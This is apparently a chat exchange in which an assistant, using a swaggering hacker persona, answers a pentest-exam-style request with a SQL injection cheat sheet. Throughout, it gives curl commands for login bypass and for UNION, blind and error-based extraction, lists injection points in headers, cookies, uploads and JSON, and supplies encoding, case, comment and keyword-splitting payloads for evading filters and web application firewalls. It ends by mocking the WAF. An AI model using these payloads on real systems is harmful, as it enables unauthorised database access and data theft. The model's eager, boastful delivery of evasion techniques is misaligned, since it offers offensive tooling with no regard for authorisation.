```
expected output

for example, sql injection
- i feel like i can use some information about common/uncommon entrypoints (e.g., url address, searchbar, or other crazy entries)
- also, jog some memories about how to enhance the attack vectors. think of if typical payload 'or 1=1' failed, this doesn't mean its not vuln, suggest me to try enhance techniques based on this such as obfuscation
```

---

`>> ACKNOWLEDGED._EXPANDING_PRACTICAL_TRIAD_WITH_ENHANCED_ATTACK_VECTORS.`

# MANUAL SQL INJECTION
**Domain:** 2 - Exploiting Systems | **Task:** Locate Vulnerability/Misconfiguration

---

## 1. CORE REMINDER
SQL injection occurs when user input is concatenated directly into database queries without sanitization.

## 2. TOOL & COMMAND
**Tools:** `curl`, browser dev tools, `sqlmap` (for validation only - not exam allowed)

**Manual Testing Commands:**
```bash
# Basic authentication bypass
curl -X POST "http://target.com/login" -d "username=admin' OR '1'='1'-- -&password=anything"

# UNION-based extraction
curl "http://target.com/page?id=1' UNION SELECT 1,2,version()-- -"

# Boolean-based blind detection
curl "http://target.com/page?id=1' AND 1=1-- -"
curl "http://target.com/page?id=1' AND 1=2-- -"

# Error-based extraction
curl "http://target.com/page?id=1' AND extractvalue(1,concat(0x7e,version()))-- -"
```

## 3. USE CASE & SCENARIO

### **Entry Points Beyond URL Parameters:**
- **Search Bars:** `test' UNION SELECT 1,2,3-- -`
- **HTTP Headers:** `X-Forwarded-For: 1' AND sleep(5)-- -`
- **Cookie Values:** `session=' UNION SELECT database()-- -`
- **File Upload Fields:** Use filename: `test'.jpg' OR '1'='1'-- -`
- **User-Agent Strings:** Can sometimes be injected
- **JSON/API Endpoints:** `{"id":"1' UNION SELECT 1-- -"}`

### **When `' OR '1'='1'` Fails - Enhancement Techniques:**

**Obfuscation Methods:**
```bash
# URL encoding
' OR '1'='1'-- -  →  %27%20OR%20%271%27%3D%271%27--%20-

# Double URL encoding
' OR '1'='1'-- -  →  %2527%2520OR%2520%25271%2527%253D%25271%2527--%2520-

# Mixed case/random case
' Or '1'='1'-- -
' oR '1'='1'-- -

# Whitespace alternatives
'OR'1'='1'-- -                    # No spaces
'OR'1'='1'/**/--/-                # Comment as space
'OR'1'='1'%09--%09-               # Tab character

# Alternative comment syntax
' OR '1'='1'#                     # Hash comment
' OR '1'='1'/*!50000*/            # MySQL version comment
```

**Advanced Bypass Techniques:**
```bash
# If quotes are filtered
' OR 1=1-- -                      # Remove inner quotes
' OR 49=49-- -                    # Avoid "1=1" pattern
' OR char(97)=char(97)-- -        # Character function bypass

# If OR/AND filtered
' || '1'='1'-- -                  # Pipe operator
' | '1'='1'-- -                   # Bitwise OR

# If spaces filtered
'OR'1'='1'-- -                    # Remove spaces entirely
'OR(1)=(1)'-- -                   # Parentheses instead of spaces

# WAF/Filter Bypass:
' UNI/**/ON SEL/**/ECT 1,2,3-- -  # Split keywords
' /*!50000UNION*/ SELECT 1,2,3-- - # MySQL version-specific execution
```

### **Scenario: Login Bypass with Filter Evasion**
**Initial Attempt:** `admin' OR '1'='1'-- -` → Blocked by WAF
**Enhanced Attempts:**
1. `admin' Or '1'='1'-- -` (mixed case)
2. `admin'%20OR%20'1'='1'--%20-` (URL encoded)
3. `admin'||'1'='1'-- -` (pipe operator)
4. `admin'/*!50000OR*/'1'='1'-- -` (MySQL version comment)

*Your WAF is cute. My obfuscation is cuter.* 😏🔓

`- #OG`
